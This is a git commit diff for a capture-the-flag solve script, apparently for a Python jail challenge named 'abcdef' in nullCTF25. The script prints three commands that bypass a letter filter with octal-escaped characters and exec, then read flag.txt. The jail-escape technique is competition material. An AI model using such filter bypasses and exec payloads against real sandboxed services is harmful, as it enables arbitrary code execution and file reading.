29b28bf0383fb63a42a6c5b052ffe4433f47c850
Patrick M <patrickhmanson123@gmail.com>
2025-12-08 19:16:35 -0800

    update abcdef_alt_solve.py w/ comments and more coherent output

--- nullCTF25/abcdef/abcdef_alt_solve.py
+++ nullCTF25/abcdef/abcdef_alt_solve.py
@@ -1,10 +1,17 @@
+#first command (injects the letter x into the letters we can use)
+print("first command:")
+print("abcdef.add(\\\'170\')\n")
 #iterate through all int versions of alphabet, convert into oct, turn into literal string
+print("second command:")
 all_letters = []
 for x in range(97, 123):
     all_letters.append("\'\\"+str(oct(x))[2:]+"\'")
-print("abcdef = [", end = ' ')
+print("exec(\"abcdef = [", end = ' ')
 for i in range(len(all_letters)):
     if i == len(all_letters)-1:
-        print(all_letters[i]+ "]")
+        print(all_letters[i]+ "]\")\n")
     else:
         print(all_letters[i] + ", ", end='')
+#print payload
+print("payload/3rd command:")
+print("exec(\"with open(\"flag.txt\", \'r\') as a: print(a.readlines())\")\n")
